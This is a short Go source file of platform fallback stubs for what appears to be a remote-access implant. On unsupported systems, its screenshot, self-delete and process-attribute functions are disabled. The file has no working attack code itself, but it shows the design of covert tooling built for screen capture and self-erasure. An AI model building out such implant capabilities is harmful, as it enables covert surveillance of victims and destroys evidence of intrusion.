//go:build !linux && !windows

// implant/platform_unsupported.go
package main

import (
	"fmt"
	"os/exec"
)

func init() {
	// Provide default/fallback implementations if no OS-specific one is loaded.
	// This prevents nil pointer dereferences if functions are called on an unsupported OS.

	if takeScreenshot == nil {
		takeScreenshot = func() (string, error) {
			return "", fmt.Errorf("screenshot functionality is not supported on this platform")
		}
	}

	if doSelfDelete == nil {
		doSelfDelete = func(exePath string) {
			// No-op or log: Self-delete not implemented for this platform
		}
	}

	if setOSSpecificAttrs == nil {
		setOSSpecificAttrs = func(cmd *exec.Cmd) {
			// No-op: No specific OS attributes to set for this platform by default
		}
	}
}
